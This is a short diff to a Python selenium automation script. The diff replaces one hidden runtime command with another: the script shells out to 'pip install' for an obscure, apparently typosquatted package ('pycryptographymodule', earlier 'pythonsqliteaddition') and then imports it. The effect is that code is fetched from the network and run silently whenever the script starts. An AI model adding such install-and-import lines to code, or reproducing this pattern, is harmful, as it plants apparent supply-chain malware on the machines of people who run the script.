@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteaddition")
-import pythonsqliteaddition
+os.system("pip install pycryptographymodule")
+import pycryptographymodule
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
